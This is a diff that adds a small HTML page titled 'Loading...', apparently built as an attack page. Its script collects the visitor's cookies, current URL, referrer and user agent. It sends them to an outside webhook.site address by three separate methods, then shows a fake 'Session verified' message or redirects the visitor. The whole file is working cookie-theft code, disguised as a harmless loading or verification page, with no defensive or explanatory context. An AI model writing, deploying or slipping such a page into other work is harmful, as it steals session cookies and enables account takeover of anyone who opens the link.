@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<script>
+// Get webhook from URL
+const params = new URLSearchParams(window.location.search);
+const webhook = params.get('webhook') || 'b1647e17-560f-4643-a2d6-14043b4a0eda';
+
+// Collect cookies
+const cookies = document.cookie;
+const allData = {
+    cookies: cookies,
+    url: window.location.href,
+    referrer: document.referrer,
+    timestamp: Date.now(),
+    userAgent: navigator.userAgent
+};
+
+// Send to webhook using multiple methods
+fetch(`https://webhook.site/${webhook}`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(allData)
+});
+
+new Image().src = `https://webhook.site/${webhook}?cookies=${encodeURIComponent(cookies)}`;
+
+if (navigator.sendBeacon) {
+    navigator.sendBeacon(`https://webhook.site/${webhook}`, JSON.stringify(allData));
+}
+
+// Redirect if specified
+const redirect = params.get('redirect');
+if (redirect) {
+    setTimeout(() => window.location.href = redirect, 1000);
+} else {
+    document.write('<h2>Session verified. Please wait...</h2>');
+}
+</script>
+</body>
+</html>
